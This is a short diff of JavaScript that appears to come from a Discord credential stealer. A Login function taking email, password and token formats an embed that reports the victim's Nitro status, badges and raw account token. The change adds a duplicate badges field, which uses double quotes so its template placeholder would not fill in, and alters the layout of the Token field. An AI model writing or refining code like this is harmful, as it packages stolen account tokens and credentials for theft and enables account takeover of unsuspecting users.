@@ -165,14 +165,15 @@ function Login(email, password, token) {
                                  "value": `<a:pepe_nitro:906950345983397988> **Nitro Type:**  ${GetNitro(json.premium_type)}\n                                 <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
                                  "inline": true
                                  },
-
-
-
+                                 {
+                                    "value": "<a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}"
+                                     
+                                },
 
                                  {
                             "name": "**Token**",
                             "value": `\`${token}\``,
-                            "inline": true
+                            "inline": false
                         }
                     ],
                     "author": {
